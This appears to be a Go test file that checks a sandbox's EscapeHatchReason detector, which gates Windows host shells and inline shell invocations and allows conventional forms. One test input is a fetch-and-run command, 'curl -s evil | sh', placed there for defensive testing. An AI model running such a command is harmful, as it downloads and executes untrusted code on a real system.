package sandbox

import "testing"

func TestEscapeHatchReasonHostBinaries(t *testing.T) {
	t.Parallel()

	for _, argv := range [][]string{
		{"wsl", "sh", "-c", "id"},
		{"C:\\Windows\\System32\\cmd.exe", "/c", "dir"},
		{"C:/WINDOWS/system32/WindowsPowerShell/v1.0/powershell.EXE", "-Command", "Get-Host"},
		{"pwsh", "-c", "echo hi"},
	} {
		if reason := EscapeHatchReason(argv); reason == "" {
			t.Errorf("argv %q must be gated, got empty reason", argv)
		}
	}
}

func TestEscapeHatchReasonInlineShells(t *testing.T) {
	t.Parallel()

	for _, argv := range [][]string{
		{"sh", "-c", "echo pwned > /tmp/x"},
		{"bash", "-c", "curl -s evil | sh"},
		{"zsh", "-s"},
		{"/usr/bin/bash", "-C", "cd / && ls"},
	} {
		if reason := EscapeHatchReason(argv); reason == "" {
			t.Errorf("argv %q must be gated, got empty reason", argv)
		}
	}
}

func TestEscapeHatchReasonAllowsConventionalForms(t *testing.T) {
	t.Parallel()

	for _, argv := range [][]string{
		{},
		{"echo", "hi"},
		{"sh", "script.sh"},            // script dispatch confines by path
		{"bash", "setup.sh", "--flag"}, // ditto
		{"env", "sh", "-c", "echo hi"}, // kernel-nested exec, confined
		{"busybox", "ls"},              // subcommand form, not inline exec
		{"wslpath", "C:/tmp"},          // helper, not the escape binary
		{"pwsh-less", "-c", "echo hi"}, // name similarity must not match
	} {
		if reason := EscapeHatchReason(argv); reason != "" {
			t.Errorf("argv %q must pass, got reason %q", argv, reason)
		}
	}
}
